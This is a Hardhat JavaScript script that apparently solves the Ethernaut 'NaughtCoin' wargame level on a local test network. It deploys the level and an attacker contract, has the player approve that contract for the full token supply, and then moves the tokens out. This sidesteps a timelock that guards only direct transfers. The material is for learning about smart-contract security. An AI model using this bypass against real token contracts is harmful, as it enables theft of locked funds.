const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();
    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    // deploy factory
    console.log("\n[1] Deploy NaughtCoinFactory");
    const Factory = await ethers.getContractFactory("NaughtCoinFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- NaughtCoinFactory address: ", factory.address);

    // deploy new instance
    console.log("\n[2] Create a Ctrt instance");
    const receipt = await factory.createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].address;
    const naughtCoin = await ethers.getContractAt("NaughtCoin", instance_address, owner);
    console.log("---- Ctrt address: ", naughtCoin.address);

    console.log("\n[3] Deploy Attacker");
    const Attack = await ethers.getContractFactory("NaughtCoinAttack");
    const attack = await Attack.connect(player).deploy();
    await attack.deployed();
    console.log("---- Attacker address: ", attack.address);
    await attack.register(naughtCoin.address);
    console.log("---- Register ctrt!");

    console.log("\n[4] Attack");
    // test
    {
        const total_supply = await attack.totalSupply();
        console.log("---- total supply:  ", total_supply);

        const balance_of_player = await attack.balanceOf(player.address);
        console.log("---- player balance:", balance_of_player);
    }

    // ATTACK
    const amount = '1000000000000000000000000';
    // approve 
    await naughtCoin.connect(player).approve(attack.address, amount);

    let aa = await naughtCoin.allowance(player.address, attack.address);
    console.log(aa);

    await attack.attack(owner.address, amount);


    // check
    let res = await factory.validateInstance(naughtCoin.address, player.address);

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});


